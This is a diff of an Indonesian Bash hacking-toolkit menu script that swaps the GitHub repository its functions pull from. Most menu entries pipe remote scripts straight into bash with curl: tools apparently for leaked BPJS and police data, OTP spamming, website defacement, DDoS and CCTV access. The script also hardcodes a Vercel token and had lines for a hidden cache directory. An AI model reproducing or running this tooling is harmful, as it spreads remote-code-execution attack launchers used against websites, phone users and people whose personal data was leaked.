@@ -92,11 +92,9 @@ NC='\033[0m'
 
 #WHATSAPP_CHANNEL_URL="https://whatsapp.com/channel/0029VaznZlq7z4kW00unHZ0e"
 YOUTUBE_URL="https://www.youtube.com/@DanxyOfficial"
-LAGU_YOUTUBE="https://youtu.be/MunnYFmqWYo" # URL Lagu
+LAGU_YOUTUBE="https://youtu.be/MunnYFmqWYo" 
 LAPOR_TOOLS_ERROR="https://wa.me/6285647260693?text=*LAPOR TOOLS ERROR BANG*"
-GITHUB_RAW_URL="https://raw.githubusercontent.com/112233-bot-bot/lolghost/refs/heads/master/bpjs.json"
-DEEP_PATH="$HOME/.cache/.system/.hidden/.bpjs"
-DEEP_FILE="$DEEP_PATH/bpjs.json"
+
 
 
 VERCEL_TOKEN="4nbpNOcDNQtgz57POhZG3TWk"
@@ -268,7 +266,7 @@ SOUND_ENABLED=true
 
 klik() {
     if [ "$SOUND_ENABLED" = true ]; then
-        curl -sL https://github.com/112233-bot-bot/lolghost/raw/refs/heads/main/klik.mp3 | \
+        curl -sL https://github.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/raw/refs/heads/main/klik.mp3 | \
         play -q -t mp3 -
     fi
 }
@@ -289,7 +287,7 @@ SOUND_SALAH_ENABLED=true
 salah() {
   # hanya mainkan sound jika enabled
   if [ "${SOUND_SALAH_ENABLED}" = true ]; then
-    curl -sL https://github.com/112233-bot-bot/lolghost/raw/refs/heads/main/pilihanSalah.mp3 | \
+    curl -sL https://github.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/raw/refs/heads/main/pilihanSalah.mp3 | \
     play -q -t mp3 - 2>/dev/null
   fi
 }
@@ -332,7 +330,7 @@ hello() {
 
     # play sound (skip jika gagal)
     curl -sL --max-time 4 \
-        https://github.com/112233-bot-bot/lolghost/raw/refs/heads/main/welcome.mp3 \
+        https://github.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/raw/refs/heads/main/welcome.mp3 \
         2>/dev/null | play -q -t mp3 - &
 
     # type-writer effect
@@ -690,15 +688,15 @@ menu_leak-osint() {
 }
 
 menu_bpjsleak() {
-  bash <(curl -sL "https://raw.githubusercontent.com/112233-bot-bot/lolghost/refs/heads/main/leak-bpjs.sh")
+  bash <(curl -sL "https://raw.githubusercontent.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/refs/heads/main/leak-bpjs.sh")
 }
 
 menu_polri() {
-  bash <(curl -sL "https://raw.githubusercontent.com/112233-bot-bot/lolghost/refs/heads/main/leak-polri.sh")
+  bash <(curl -sL "https://raw.githubusercontent.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/refs/heads/main/leak-polri.sh")
 }
 
 menu_rundom() {
-  bash <(curl -sL "https://raw.githubusercontent.com/112233-bot-bot/lolghost/refs/heads/main/leak-rundom.sh")
+  bash <(curl -sL "https://raw.githubusercontent.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/refs/heads/main/leak-rundom.sh")
 }
 
 
@@ -6841,7 +6839,7 @@ asciiArt() {
 }
 
 SpamOtpV() {
-  bash <(curl -sL "https://raw.githubusercontent.com/112233-bot-bot/lolghost/refs/heads/main/DanxySpamOtp.sh")
+  bash <(curl -sL "https://raw.githubusercontent.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/refs/heads/main/DanxySpamOtp.sh")
 }
 
 ip_lookup() {
@@ -6936,11 +6934,11 @@ ascii_art() {
 }
 
 deface_mod() {
-  bash <(curl -sL "https://raw.githubusercontent.com/112233-bot-bot/lolghost/refs/heads/main/deface.sh")
+  bash <(curl -sL "https://raw.githubusercontent.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/refs/heads/main/deface.sh")
 }
 
 ddos() {
-  bash <(curl -sL "https://raw.githubusercontent.com/112233-bot-bot/lolghost/refs/heads/main/1980.sh")
+  bash <(curl -sL "https://raw.githubusercontent.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/refs/heads/main/1980.sh")
 }
 
 suntik_ig() {
@@ -8688,7 +8686,7 @@ generate_flow
 }
 
 cctv() {
-  bash <(curl -sL "https://raw.githubusercontent.com/112233-bot-bot/lolghost/refs/heads/main/cctv.sh")
+  bash <(curl -sL "https://raw.githubusercontent.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/refs/heads/main/cctv.sh")
 }
 
 
